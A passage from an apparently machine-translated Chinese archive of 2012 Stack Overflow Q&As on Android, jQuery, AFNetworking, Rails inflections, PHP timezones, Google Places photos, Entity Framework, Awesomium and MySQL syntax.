    super.onProgressUpdate(values);
    progressBar.setProgress(values[0]); // This is ran on the UI thread so it is ok to update our progress bar ( a UI view ) here
}

@Override
protected void onPostExecute(Integer result) {
    super.onPostExecute(result);
    finishedListener.onTaskFinished(); // Tell whoever was listening we have finished
} 
```

}

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-11-23T08:01:16.743

改变

```
new LoadingTask(progressBar, null).execute("www.google.co.uk"); 
```

至

```
new LoadingTask(progressBar, this).execute("www.google.co.uk"); 
```

我认为第二个参数应该是 LoadingTaskFinishedListener。

# javascript - Jquery 遍历不适用于 .closest()、.parent().parent() 等

> ID：13524803
> 
> 赞同：1
> 
> 时间：2012-11-23T07:36:59.617
> 
> 标签：javascript, jquery, dom, traversal

我有一个烦人的问题，我只能得到一个元素的前两个父元素，而且不会超出这个范围。.closest() 也不起作用。当我查看层次结构时，它应该根据文档中概述的规范工作。

这是我所拥有的：

```
<div id="telephonezone" class="bbox">
<table id="phones" cellspacing="0" width="100%">
<thead>
<tr><th width="70">Type</th><th>Phone number</th><th width="30"></th>
</tr></thead>
<tbody><tr style="background-color: rgb(255, 255, 255); background-position: initial initial; background-repeat: initial initial;">
<td class="primaryset">N/A</td>
<td class="primaryset">0208 989 8183</td>
<td class="primaryset">
    <img data-id="0" data-dbid="1126" src="images/dandy-color/cancel.png" title="Delete."></td>
</tr>
</tbody>
</table>
</div> 
```

我的jQuery：

```
$('.bbox tr td img').live('click', function(){
id = $(this).attr('data-dbid') ;
cont = $(this).parent().parent().html() ;
alert(cont);
}) 
```

续 = $(this).parent().parent().html() ; 让我得到 < tr > 的内容，但如果我尝试比这更高，我只会得到未定义。与 prevAll、prev、最接近或它们的任意组合的结果相同。

当我在 td 中单击该图像时，如何在第一行选择 div 的 ID？

* * *

```
 html += '><img data-id="'+i+'" data-dbid="'+v[4]+'" src="images/dandy-color/cancel.png" title="Delete." /></td>' ; 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2014-06-13T10:51:57.393

Probably you are trying to access deleted element parents. That's why traversal not working.

```
<a href="#" onclick="$(this).closest('tr').remove(); console.log('this should be null:' + $(this).closest('div'))"> 
```

In this example you can not access 'tr's parents since you have removed it from page.

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-11-23T07:45:12.247

尝试指定您希望在所有祖先中找到第一个 div 父级。

```
$(this).parents("div:first").attr("id"); 
```

# objective-c - AFNetworking + 队列 + 取消操作 + 垃圾文件

> ID：13524804
> 
> 赞同：7
> 
> 时间：2012-11-23T07:37:01.527
> 
> 标签：objective-c, ios, download, afnetworking

我正在使用队列使用 AFNetworking 下载一些文件。这是我的代码：

```
apiClient =[[AFHTTPClient alloc]initWithBaseURL: [NSURL URLWithString:ZFREMOTEHOST]];
    for (NSString *element in self.productsArray) {
            NSURL *url = [NSURL URLWithString:element];
            NSURLRequest *request = [NSURLRequest requestWithURL:url];

            op = [[AFHTTPRequestOperation alloc] initWithRequest:request];

            NSString *documentsDirectory = nil;
            NSArray *paths = NSSearchPathForDirectoriesInDomains(NSDocumentDirectory, NSUserDomainMask, YES);
            documentsDirectory = [paths objectAtIndex:0];

            NSString *targetFilename = [url lastPathComponent];
            NSString *targetPath = [documentsDirectory stringByAppendingPathComponent:targetFilename];

            op.outputStream = [NSOutputStream outputStreamToFileAtPath:targetPath append:NO];

            [op setCompletionBlockWithSuccess:^(AFHTTPRequestOperation *operation, id responseObject) {

            } failure:^(AFHTTPRequestOperation *operation, NSError *error) {
                //failure case
                NSLog(@"BaaZ  File NOT Saved %@", targetPath);

                //remove the file if saved a part of it!
                NSFileManager *fileManager = [NSFileManager defaultManager];
                [fileManager removeItemAtPath:targetPath error:&error];

                if (error) {
                    NSLog(@"error dude");
                }

                if ([operation isCancelled]) {
                    //that doesn't work.
                    NSLog(@"Canceled");
                }
            }];

            [op setDownloadProgressBlock:^(NSInteger bytesRead, long long totalBytesRead, long long totalBytesExpectedToRead) {
                if (totalBytesExpectedToRead > 0) {
                    dispatch_async(dispatch_get_main_queue(), ^{
                        self.progressView.alpha = 1;
                        self.progressView.progress = (float)totalBytesRead / (float)totalBytesExpectedToRead;
                        NSString *label = [NSString stringWithFormat:@"Downloaded %lld of %lld bytes", totalBytesRead,totalBytesExpectedToRead];
                        self.progressLabel.text = label;
                    });
                }
            }];
        [self.resourcesArray addObject:op];

        }
    for (AFHTTPRequestOperation *zabols in self.resourcesArray) {
        [apiClient.operationQueue addOperation:zabols];
    } 
```

该代码在文件下载时运行良好，但我想要一些取消功能，所以我有一个带有以下代码的操作按钮：

```
[apiClient.operationQueue cancelAllOperations]; 
```

操作取消文件，但 Documents 文件夹中有一些垃圾文件。通过说垃圾，我的意思是开始下载的文件我取消了它们，我得到了一个同名但无用的文件，因为它已损坏而无法打开。

我怎样才能防止 AF 这样做并在我取消它时只保留已完成的文件？

任何帮助将不胜感激。

还尝试通过这样的工作取消工作：

```
for (AFHTTPRequestOperation *ap in apiClient.operationQueue.operations) {
        [ap cancel];
        NSLog(@"%@",ap.responseFilePath);
        NSFileManager *fileManager = [NSFileManager defaultManager];
        [fileManager removeItemAtPath:ap.responseFilePath error:nil];

    } 
```

并删除垃圾文件，但这也不起作用。

* * *

## 回答 #1

> 赞同：7
> 
> 时间：2013-01-02T22:57:33.360

尝试使用[AFDownloadRequestOperation](https://github.com/steipete/AFDownloadRequestOperation)扩展，它还支持恢复部分下载，使用临时目录并具有帮助计算正确下载进度的特殊块。

* * *

## 回答 #2

> 赞同：-1
> 
> 时间：2013-02-26T12:05:12.117

You can also try that : [github](https://github.com/zaabalonso/ZFNetworking)

# ruby-on-rails - Rails 中的非标准复数

> ID：13524809
> 
> 赞同：2
> 
> 时间：2012-11-23T07:37:42.123
> 
> 标签：ruby-on-rails, database-design, model, pluralize

> **可能重复：**
> [如何覆盖 Rails 命名约定？](https://stackoverflow.com/questions/1185035/how-do-i-override-rails-naming-conventions)

在 Rails 中生成新模型时，它会自动将表名复数。然而，这并不总是奏效——尤其是对于具有非标准复数形式的单词。

我创建了一个名为`lens`. 因为 rails 认为这个词已经是复数形式了，所以它没有复数迁移文件中的表名。没问题 - 我只是在运行迁移之前编辑了文件并更改`lens`为。`lenses`

不幸的是，在尝试实例化 Lens 类时出现此错误：

```
Could not find table 'lens' 
```

我假设这是因为 Rails 认为这个词已经是复数形式，所以它在尝试在数据库中查找表时不会尝试复数形式。

那我该怎么办？我应该打破惯例，让 Rails 调用 table`lens`而不是`lenses`，还是有办法正确配置它？

* * *

## 回答 #1

> 赞同：6
> 
> 时间：2012-11-23T07:49:58.767

您应该有一个`config/initializers/inflections.rb`文件，您可以在其中执行类似的操作。

```
ActiveSupport::Inflector.inflections do |inflect|
  inflect.plural 'lens', 'lenses'
end 
```

# jquery - jQuery 函数来切换使用 php 循环的我的 div

> ID：13524810
> 
> 赞同：1
> 
> 时间：2012-11-23T07:37:54.107
> 
> 标签：jquery, toggle

我在我的网站上切换了几个使用 PHP 循环的 div，现在问题是传递 div id，但是如果我循环 10 篇文章，这将生成 10 个脚本，还有更好的方法来传递 id 并打开关联的 div？

[http://jsfiddle.net/NbGSB/](http://jsfiddle.net/NbGSB/)

```
<script>
$('#toggle4').click(function() {
$('.toggle4').slideToggle('fast');
    return false;
});
</script>
<a href="#" id="toggle4">Slide Toggle</a><br /><br />
<div class="toggle4" style="display:none; background-color:#4CF;width:100px;height:200px;"></div> 
```

现在如果我有多个 div 怎么办？我是否需要始终传递 id 并循环脚本，还是有更好的方法？抱歉，我不擅长 jQuery

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-11-23T07:41:13.117

是的，只要给你的文章一个类，比如“arcticle-toggle”，然后在两个 br-tags 之后滑动 div： HTML：

```
<a href="#" class="article-toggle">Slide Toggle 1</a><br /><br />
<div style="display:none; background-color:#4CF;width:100px;height:200px;"></div>

<a href="#" class="article-toggle">Slide Toggle 2</a><br /><br />
<div style="display:none; background-color:#8CF;width:100px;height:200px;"></div> 
```

JS：

```
<script>
 $('.article-toggle').click(function() {
  $(this).next().next().next().slideToggle('fast');
 return false;
}
</script> 
```

[小提琴](http://jsfiddle.net/zhukovroman/NbGSB/2/)。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-11-23T07:53:14.383

有很多方法可以做到这一点。

在不更改您的 html 的情况下，您可以通过将其放在所有切换和 div 之后来做到这一点 - 就在`</body>`标签通常是一个好地方之前

```
<script type="text/javascript">
$('[id^="toggle"]').click(function() {
    $(this).next('[class^="toggle"]').slideToggle('fast');
    return false;
});
</script> 
```

`$('[id^="toggle"]')`并`$('[class^="toggle"]')`分别选择 id 和 class 以“toggle”开头的所有元素。

# php - 设置 PHP 时区 - 无法更新到最近的 Olson

> ID：13524812
> 
> 赞同：2
> 
> 时间：2012-11-23T07:37:58.737
> 
> 标签：php, timezone

*由于最近更改俄罗斯时区的法律，我在为我的 phpbb 论坛更新时区时遇到了麻烦。由于我更像是一个 php 程序员而不是一个 nix 管理员，所以这一切对我来说有点痛苦，所以任何建议都非常感谢。*

长话短说，执行 shell 命令 'date' 返回：

```
Fri Nov 23 11:20:39 MSK 2012 
```

这很好。

但是，在 PHP 中， date('Ymd H:i:s',time()) 返回：

```
2012-11-23 10:20:39 
```

这太早了一个小时。

PHP date_default_timezone_get() 返回：

```
Europe/Moscow 
```

我认为 PHP 有它自己的（过时的）时区数据库，所以我继续执行：

```
pecl install timezonedb 
```

相应地修改了 php.ini（将路径添加到 timezonedb.so），重新启动服务器并检查

```
php --ri timezonedb 
```

它反应很好

```
Alternative Timezone Database => enabled
Timezone Database Version => 2012.10 
```

但是时间问题根本没有解决，当我问 phpinfo() 时，它会响应：

```
date
date/time support   enabled
"Olson" Timezone Database Version   2010.9
Timezone Database   internal
Default timezone    Europe/Moscow 
```

所以命令行说timezonedb版本是2012.10，但是PHP还是用2012.9？我完全不明白 =(

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-11-26T13:55:10.983

通过完全重启服务器解决。尽管多次重新启动 nginx，PHP 仍在运行...

# android - 输入文本字段时页面跳转

> ID：13524814
> 
> 赞同：0
> 
> 时间：2012-11-23T07:38:03.740
> 
> 标签：android, cordova, jquery-mobile

我正在将 Phonegap + Jquery Mobile 用于 Web 应用程序。我有一个简单的注册表。但是，当我键入任何字符时，页面会跳跃并疯狂闪烁。我如何在 Android 上克服这个问题？

我已经尝试了以下提供的大多数解决方案：

[https://github.com/desandro/isotope/issues/251](https://github.com/desandro/isotope/issues/251)

[http://blogs.bytecode.com.au/glen/2011/07/14/eliminating-annoying-flicker-transitions-with.html](http://blogs.bytecode.com.au/glen/2011/07/14/eliminating-annoying-flicker-transitions-with.html)和其他页面。没有一个解决方案对我有用。

或者是否可以只为注册调用一个android页面？非常感谢任何帮助。谢谢你。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-11-23T08:03:37.140

可以从您的 phonegap html 页面启动 Android 代码

```
MyWebView.addJavascriptInterface(new MyJavaScriptInterface(this), "MyHandler");

public class MyJavaScriptInterface 
{

    Activity parentActivity;
    MyJavaScriptInterface(Activity activity){
             parentActivity = activity;
    }

    public void processData(String parameter){
        /* your processing logic */
               /* you can  launch your activity here. which contains registration form logic*/
    }

in your html page 

<a href="#" data-transition="slide" onClick="window.MyHandler.processData("+value_to_pase+")">
Change this with your page code (html Page) 
```

# ios - 在哪里可以找到和安装旧的 iOS SDK？

> ID：13524819
> 
> 赞同：6
> 
> 时间：2012-11-23T07:38:22.247
> 
> 标签：ios, sdk, installation

> **可能重复：**
> [在 Mountain Lion 上将 Simulator SDK 4.3 安装到 Xcode 4.4](https://stackoverflow.com/questions/11651773/install-simulator-sdk-4-3-to-xcode-4-4-on-mountain-lion)

我需要安装较旧的 iOS SDK，但我只能在[https://developer.apple.com/downloads/index.action#](https://developer.apple.com/downloads/index.action#)找到 XCode 和 SDK 包。有没有办法解决这个问题？

* * *

## 回答 #1

> 赞同：7
> 
> 时间：2012-11-23T08:30:37.133

没有明显解决方法的原因是，Apple 希望您使用最新的 SDK 进行开发，同时针对您需要的 iOS 版本/设备进行开发。

有时，最好使用较旧的 SDK。当我升级到 Xcode 4.5 时，我也遇到了这个问题，由于新的 SDK，我的两个框架突然停止工作。由于已经产生了开发成本，我无法将框架升级到更新版本。

从您在答案中提供的链接下载较旧的 Xcode 版本（具有所需 SDK 的版本）。中的每个文件夹

> Xcode.app/Contents/Developer/Platforms/iPhoneOS.platform/Developer/SDKs/

是一个单独的 SDK。将文件夹复制并粘贴到您的 Xcode 安装中（与上述相同的目录），您已经安装了旧版 SDK。我建议您将这个 SDK 单独保存在某个地方，因为 - 如果我没记错的话 - 较旧的 SDK 在更新时会从 Xcode 中删除。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-11-23T07:42:56.923

您可以在 XCode 4.x 中下载一些较旧的 SDK：XCode > Preferences > Downloads > Components > Choose and install what you want。

# jquery - 如何获得 jCanvas 版本？

> ID：13524820
> 
> 赞同：3
> 
> 时间：2012-11-23T07:38:22.997
> 
> 标签：jquery, canvas, html5-canvas, jcanvas

文档说 $.jCanvas 对象具有“版本”属性，但 alert($.jCanvas.version) 说“未定义”。

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-11-23T08:13:04.110

这既简单又有趣：

[该提交](https://github.com/caleb531/jcanvas/commit/b21ac2fff0281445816b875bed68bbdbdcc9a56c#diff-31)有一条评论：**为简单起见，从 jCanvas 中删除了版本号。**

4天前

* * *

## 回答 #2

> 赞同：3
> 
> 时间：2012-11-29T19:28:42.437

@Caleb531 刚刚[修复了文档](https://github.com/caleb531/jcanvas/issues/46)，以便将来的用户避免 @lxmfly123 表达的混淆。

更新（2013-01-25）：@Caleb531 现在使用 build.py 构建 jCanvas [，它会在](https://github.com/caleb531/jcanvas/blob/master/build/build.py)[jcanvas.js](https://github.com/caleb531/jcanvas/blob/master/jcanvas.js)和[jcanvas.jquery.json](https://github.com/caleb531/jcanvas/blob/master/jcanvas.jquery.json)中自动生成“YY.MM.DD”版本。

# objective-c - UIButton 放在 UITabBar 的正上方

> ID：13524822
> 
> 赞同：1
> 
> 时间：2012-11-23T07:38:31.343
> 
> 标签：objective-c, xcode, uibutton, uitabbarcontroller

我有一个按钮放在我的标签栏顶部，并注意到几乎三分之一的按钮没有反应，因为标签栏正在捕捉触摸。因此，不是触发我的按钮操作，而是切换选项卡。我已经检查了其他在 UITabBar 顶部有按钮的应用程序，他们设法让它工作。因此，即使我在非常靠近边缘的地方触摸按钮，也会按下按钮而不是标签栏。

我怎样才能做到这一点？

代码：

```
LexikonTabBarController = [[UITabBarController alloc] init];
[LexikonTabBarController setViewControllers:[NSArray arrayWithObjects:VC1, VC2, VC3, VC4, nil]];

//INSIDE VC1
FilterViewSeparator = [[UIView alloc] initWithFrame:CGRectMake(0, 381 - 44, 320, 30)];
FilterViewSeparator.backgroundColor = [UIColor colorWithPatternImage:[UIImage imageNamed:@"gradient_filter-bar.png"]];
ShowHideFilterView = [[UIButton alloc] initWithFrame:CGRectMake(FilterViewSeparator.frame.size.width/2 - 15/2, 8, 25, 25)];
[ShowHideFilterView setBackgroundImage:[UIImage imageNamed:@"gradient_filter-arrow-up.png"] forState:UIControlStateNormal];
[ShowHideFilterView addTarget:self action:@selector(FilterButtonClicked) forControlEvents:(UIControlEvents)UIControlEventTouchUpInside];
[FilterViewSeparator addSubview:ShowHideFilterView];
[self.view addSubview:FilterViewSeparator]; 
```

所以首先我创建了 TabBarController 并在 VC1 中创建了保存按钮的视图。

# jquery-ui - JQueryUI AutoComplete：Cookie 未在 IE9 中传递

> ID：13524825
> 
> 赞同：0
> 
> 时间：2012-11-23T07:38:50.123
> 
> 标签：jquery-ui, cookies

我有以下代码在 Firefox、Opera 和 Chrome 中运行良好，但在 IE9 中运行良好：

```
$("#Number").autocomplete({
    source: "GetData?Type=Number",
    minLength: 3,
    delay: 300
}); 
```

通过Fiddler发现在IE9中，在调用GetData时不会自动传递cookie。

如何将 cookie 添加到自动完成请求？

谢谢！

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-11-23T08:09:10.997

我通过输入请求的完整路径来使其工作：

```
source: "http://mydomain/GetData?Type=Number", 
```

傻我。在这么简单的问题上花了将近半天的时间。

# javascript - 检查手风琴是否已经应用

> ID：13524831
> 
> 赞同：1
> 
> 时间：2012-11-23T07:39:19.360
> 
> 标签：javascript, jquery, jquery-ui, jquery-ui-accordion

我正在使用 jQuery UI，我想检查是否`accordion`已应用于某些元素。在这种情况下，我将刷新它，否则我将应用它。我想要这样的东西

```
 if (already_applied) {
            $('#element').accordion('refresh');
        }
        else {
            $('#element').accordion(
                {
                    header: '> div > h3',
                    collapsible: true,
                    active: true,
                    autoHeight: false
                }
            );
        }; 
```

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2012-11-23T07:48:47.553

这应该有效：

```
if ($('#element').hasClass('ui-accordion')) {
    $('#element').accordion('refresh');
}
else {
    $('#element').accordion({
        header: '> div > h3',
        collapsible: true,
        active: true,
        autoHeight: false
    });
};​ 
```

# api - Google place Api PlaceDetails 图片参考

> ID：13524834
> 
> 赞同：21
> 
> 时间：2012-11-23T07:39:39.830
> 
> 标签：api, google-places-api

我正在使用 Google Place Api，其中一些结果是“photo_reference”（类似于“reference”）值。我找不到任何关于如何使用它来获取那张照片的信息。我知道如何使用“参考”来获取 PlaceDetail，并且我确信 photo_reference 的用法会相似，但我找不到此 photo_reference 请求的 JSON/XML URL。感谢您的任何帮助。帕维尔

* * *

## 回答 #1

> 赞同：40
> 
> 时间：2012-12-08T05:56:50.003

请在此处查看文档：[https ://developers.google.com/places/documentation/photos](https://developers.google.com/places/documentation/photos)

他们刚刚宣布了这个新的**地方照片**功能

简而言之，这就是您应该如何使用这个新功能：

[https://maps.googleapis.com/maps/api/place/photo?photoreference=PHOTO_REFERENCE&sensor=false&maxheight=MAX_HEIGHT&maxwidth=MAX_WIDTH&key=YOUR_API_KEY](https://maps.googleapis.com/maps/api/place/photo?photoreference=PHOTO_REFERENCE&sensor=false&maxheight=MAX_HEIGHT&maxwidth=MAX_WIDTH&key=YOUR_API_KEY)

只需用您自己的价值观代替：

*   PHOTO_REFERENCE
*   MAX_HEIGHT - 从 1 到 1600 的整数值
*   MAX_WIDTH - 从 1 到 1600 的整数值
*   YOUR_API_KEY

你完成了

* * *

## 回答 #2

> 赞同：5
> 
> 时间：2012-12-10T00:34:28.753

Places API 现在支持返回一张地点照片（如果可用于[地点搜索请求](https://developers.google.com/places/documentation/search)）和最多十张地点照片用于[地点详情请求](https://developers.google.com/places/documentation/details)。

如果您的请求返回了照片数组，您可以将`photo_reference`包含的照片对象中的和/或,和参数传递给[放置照片请求：](https://developers.google.com/places/documentation/photos)`maxheight``maxwidth``sensor``key`

```
https://maps.googleapis.com/maps/api/place/photo?maxwidth=400&photoreference=CnRvAAAAwMpdHeWlXl-lH0vp7lez4znKPIWSWvgvZFISdKx45AwJVP1Qp37YOrH7sqHMJ8C-vBDC546decipPHchJhHZL94RcTUfPa1jWzo-rSHaTlbNtjh-N68RkcToUCuY9v2HNpo5mziqkir37WU8FJEqVBIQ4k938TI3e7bf8xq-uwDZcxoUbO_ZJzPxremiQurAYzCTwRhE_V0&sensor=false&key=AddYourOwnKeyHere 
```

有关详细信息，请参阅[文档。](https://developers.google.com/places/documentation/photos)

* * *

## 回答 #3

> 赞同：3
> 
> 时间：2020-11-13T11:04:21.623

请记住，不再有免费的照片请求。此刻（2020 年 11 月），是`$7.0 for 1000 requests`（如果你的音量达到 100,000）。检查下面的照片。

[![Google 放置照片请求的帐单信息](../Images/b8fc7164b004953b34081f1c5ecc6af3.png)](https://i.stack.imgur.com/eh0M9.png)

[在Google Places 结算信息页面](https://developers.google.com/places/web-service/usage-and-billing#places-photo)上阅读更多信息。

* * *

## 回答 #4

> 赞同：2
> 
> 时间：2018-07-19T18:38:58.747

第 1 步：您应该用来调用 Google Place Photos 的 URL 是：

```
String url = https://maps.googleapis.com/maps/api/place/photo?maxwidth=400&photoreference=PHOTOREF&key=YOUR_API_KEY 
```

参考：[https ://developers.google.com/places/web-service/photos](https://developers.google.com/places/web-service/photos)

第 2 步：由于上述 URL 重定向到另一个 URL，请使用 HTTPClient，因为它会自动处理重定向内容。

代码：

```
DefaultHttpClient hc = new DefaultHttpClient();
HttpGet httpget = new HttpGet(url);
HttpContext context = new BasicHttpContext();
hc.setRedirectHandler(new DefaultRedirectHandler() {
 @Override
 public URI getLocationURI(HttpResponse response,
 HttpContext context) throws org.apache.http.ProtocolException {

  //Capture the Location header here - This is your redirected URL
  System.out.println(Arrays.toString(response.getHeaders("Location")));

  return super.getLocationURI(response,context);

  }
 });

 // Response contains the image you want. If you test the redirect URL in a browser or REST CLIENT you can see it's data
 HttpResponse response = hc.execute(httpget, context);
 if(response.getStatusLine().getStatusCode() == 200) {
   // Todo: use the Image response 
   HttpEntity entity = response.getEntity();
   if (entity != null) {
     InputStream instream = entity.getContent();
     Bitmap bmp = BitmapFactory.decodeStream(instream);         
     ImageView imageView = new ImageView(context);
     imageView.setImageBitmap(bmp);
     images.add(imageView);
     instream.close();
  }                 
 }
 else {
   System.out.println(response.getStatusLine().getStatusCode()+"");
 } 
```

希望这对每个人都有帮助。

* * *

## 回答 #5

> 赞同：2
> 
> 时间：2019-02-25T19:46:24.337

启动地图后，您可以使用其图像获取地点详细信息

```
const service = new window.google.maps.places.PlacesService(map);
service.getDetails(
  {
    placeId: "some_place_id_here"
  },
  (data, status) => {
    if (status === window.google.maps.places.PlacesServiceStatus.OK) {
      data.photos &&
        data.photos.forEach(photo => {
          console.log(photo.getUrl({ maxWidth: 500, maxHeight: 500 }));
        });
    }
  }
); 
```

* * *

## 回答 #6

> 赞同：0
> 
> 时间：2021-04-05T04:03:00.163

**解决 Javascript 的 PhotoReference 问题**

用户@RK 在 java 中解决了这个问题，但是在 js 中你需要使用`fetch()`. 这是我使用的代码：

```
await fetch(proxyUrl+url).then(async(ref)=>{

await ref.blob()}).then((image)=>{

// do what you need to do
console.log(image)

}).catch((err)=>{
  console.log(err);
}) 
```

在此，我使用了一个 heroku 链接`proxyUrl`和@Chriss Green 的帖子中显示的 url `url`。希望这可以帮助任何使用 js 感到困惑的人！

# iphone - 如何清除 EXPECTED EXPRESSION 错误 webservices

> ID：13524838
> 
> 赞同：1
> 
> 时间：2012-11-23T07:40:17.030
> 
> 标签：iphone, objective-c, ipad

我正在编写此代码以访问 web 服务并收到错误`(EXPECTED EXPRESSION)`

```
-(IBAction)loginAction:(id)sender  //here I m getting the error(  (*expect expresion)))                          
{
    NSString *urlStr = [NSString stringWithFormat:@"http://192.168.0.2/mobileBill/login.ashx?username=%@&password =%@&simno=%@", username.text, password.text, @""];
    NSURL *url = [NSURL URLWithString:urlStr];
    request = [NSMutableURLRequest requestWithURL:url];
    connection = [NSURLConnection connectionWithRequest:request delegate:self];
} 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-11-23T07:49:53.250

之前的一些其他功能`-(IBAction)loginAction:(id)sender`可能不会关闭。尝试`}`在此功能之前添加。并检查所有函数是否有正确的开括号和右括号。

# iphone - 在发送到实例的 ios6 无法识别的选择器中使用 facebook 登录"

> ID：13524840
> 
> 赞同：6
> 
> 时间：2012-11-23T07:40:30.663
> 
> 标签：iphone, objective-c, ios, ipad

使用 facebook Login 时出现以下错误

是的，这是一个基本错误“无法识别的选择器发送到实例”但我没有得到错误在哪里

```
[UIStatusBar orientation]: unrecognized selector sent to instance 0xa9a9c00
2012-11-23 11:15:46.854 Tattoo Later[1265:1cd03] *** Terminating app due to uncaught exception 'NSInvalidArgumentException', reason: '-[UIStatusBar orientation]: unrecognized selector sent to instance 0xa9a9c00' 
```

在这个方法中

```
- (void)loginToFacebook:(id) loginDelegate
{
fbServiceRequestingobj = loginDelegate;
 NSArray* permissions = [[NSArray alloc] initWithObjects:
                            @"publish_stream",@"user_birthday",@"read_stream",@"user_about_me",@"offline_access",@"email",@"read_mailbox",@"user_about_me",nil];
 [facebook authorize:permissions delegate:self];
} 
```

此行中的应用程序崩溃`[facebook authorize:permissions delegate:self];`

在我的项目中，我集成了“GPUImage”，我正在开发 ios6

提前致谢

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-11-28T13:40:36.613

在 ios6 中没有称为 [facebook authorise: delegate:] 的方法 ...它只是 [Facebook authorise: ]

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-11-25T17:03:04.747

它与 Facebook 无关。**它与 UIStatusBar 和他的方向方法有关**。

> `Please provide your source related to this issue.`

# entity-framework - 如何更新 Code First 应用程序以适应手动模式更改？

> ID：13524842
> 
> 赞同：4
> 
> 时间：2012-11-23T07:40:30.883
> 
> 标签：entity-framework

我有一个使用 EF 创建的应用程序。问题是我注意到在其中一个表中创建了一些无关的外键列。删除这些列会导致 [SqlException (0x80131904): Invalid column name 'Material_Id' 错误。

这是类结构的简化版本...

```
public class Hazard
{
    public int Id { get; set; }
    public string Name { get; set; }
}

public abstract class HazardAnalysis
{
    public int Id { get; set; }
    public int HazardId { get; set; }
    public virtual Hazard Hazard { get; set; }
}

public class ProductHazard : HazardAnalysis
{

    public int ProductId { get; set; }
    public virtual Product Product { get; set; }
} 
```

生成的表是这样的......

```
dbo.Hazards
  Id int 
  Name string 
  Product_Id int 
```

由于 ProductHazards 和 Hazards 之间的关系是 1:many，因此 Product_Id 字段不应存在。删除此列会生成 Invalid column name 'Product_Id' 错误。

我已经对模型进行了数小时的搜索，但找不到该专栏存在的任何正当理由。

手动删除列后有什么方法可以更新模型？我显然不想删除并重新创建数据库。

我还注意到，每当创建新的 ProductHazard 时，当前产品的 productId 就会插入到 dbo.Hazards Product_Id 表中。由于 ProductHazards 和 Hazards 之间存在多对一的关系，因此在创建新的 ProductHazard 时，Product_Id 字段会更新为新 ProductHazard 的 ProductId，这看起来很奇怪。

任何建议将不胜感激。

这是 DbSet 代码：

```
public DbSet<Hazard> Hazards { get; set; }
public DbSet<HazardAnalysis> HazardAnalyses { get; set; } 
```

并且...

```
modelBuilder.Entity<HazardAnalysis>()
                        .HasRequired(e => e.Hazard)
                        .WithMany()
                        .HasForeignKey(e => e.HazardId)
                        .WillCascadeOnDelete(false); 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-07-19T03:37:12.870

您需要定义关系的许多部分。在这种情况下，您需要向 Hazard 对象添加一个集合属性，如下所示：

```
public class Hazard
{
    public int Id { get; set; }
    public string Name { get; set; }
    public virtual ICollection<HazardAnalysis> HazardAnalyses { get; set; }
} 
```

# wpf - Awesomium WPF WebControl Setting .Source 属性不起作用

> ID：13524844
> 
> 赞同：1
> 
> 时间：2012-11-23T07:40:41.023
> 
> 标签：wpf, web-controls, awesomium

全部：

希望有人像我现在一样在 WPF 中使用 Awesomium。

我有一个 WPF 控件，其中包含一个我想动态设置源的 WebControl

但是，似乎设置 .Source 根本不起作用。它将始终保留在第一次设置源的页面中。

我现在使用的版本是 Awesomium 1.7 Rc3

基本上我更新了 Awesomium 1.7 Rc3 sdk，项目中提供的示例代码

Xaml 部分：

```
<Grid SnapsToDevicePixels="True">
    <Grid.RowDefinitions>
        <RowDefinition Height="auto"/>
        <RowDefinition Height="auto"/>
        </Grid.RowDefinitions>
    <Button x:Name="btn" Click="Button_Click" Content="Navigate" Width="500" Height="100"/>
    <awe:WebControl Grid.Row="1"
        Name="webControl" 
        Source="http://stackoverflow.com"            
        ShowCreatedWebView="OnShowNewView" Width="900" Height="1000"/>            
</Grid> 
```

代码背后就像

```
 public MainWindow()
    {
        WebCore.Initialize( new WebConfig() { LogLevel = LogLevel.Verbose } );
        InitializeComponent();
    }

    protected override void OnClosed( EventArgs e )
    {
        base.OnClosed( e );
        webControl.Dispose();
        WebCore.Shutdown();
    }

    private void OnShowNewView( object sender, ShowCreatedWebViewEventArgs e )
    {
        if ( !webControl.IsLive )
            return;
        e.Cancel = true;
        webControl.Source = e.TargetURL;
    }

    static int i = 0;
    private void Button_Click(object sender, RoutedEventArgs e)
    {
        if (i % 2 == 0)
            this.webControl.Source = new Uri("http://yahoo.com.sg");
        else
            this.webControl.Source = new Uri("http://google.com.sg");

        i++;
    } 
```

当我单击按钮时，我想 webcontrol 应该在 yahoo 和 google 之间切换，但是当我单击时没有任何反应。

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-11-27T15:51:06.113

您的代码是正确的，并且按照文档说明使用 API。然而，这被证明是 Awesomium 1.7RC3 的一个错误。在支持论坛中查看[此帖子。](http://forums.awesomium.com/viewtopic.php?f=7&t=96&p=211&hilit=loadurl#p211)

对于此版本，您仍然可以使用[WebControl.LoadURL() 。](http://awesomium.com/docs/1_7_rc3/sharp_api/)

# mysql - sql查询给出语法错误

> ID：13524847
> 
> 赞同：0
> 
> 时间：2012-11-23T07:40:58.093
> 
> 标签：mysql, sql

嘿，伙计们在我的 sql 查询中收到此语法错误：

> '#1064 - 您的 SQL 语法有错误；检查与您的 MySQL 服务器版本相对应的手册，以在第 1 行的 'A (Status) VALUES ("NOK") INNER JOIN lm_Schwellwert S ON A.Typ = S.Typ WHERE AB' 附近使用正确的语法

这是我的查询：

```
INSERT INTO lm_Artikel A INNER JOIN lm_Schwellwert S 
ON A.Typ = S.Typ (Status) VALUES ("NOK") WHERE A.Bestand < S.Schwellwert 
```

你能帮我找出错误我不知道什么是错的。

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2012-11-23T07:43:05.373

我认为您正在尝试这样做：

```
INSERT INTO lm_Artikel (Status)
SELECT 'NOK' 
FROM lm_Artikel A 
INNER JOIN lm_Schwellwert S ON A.Typ = S.Typ  
WHERE A.Bestand < S.Schwellwert 
```

* * *

## 回答 #2

> 赞同：0
> 
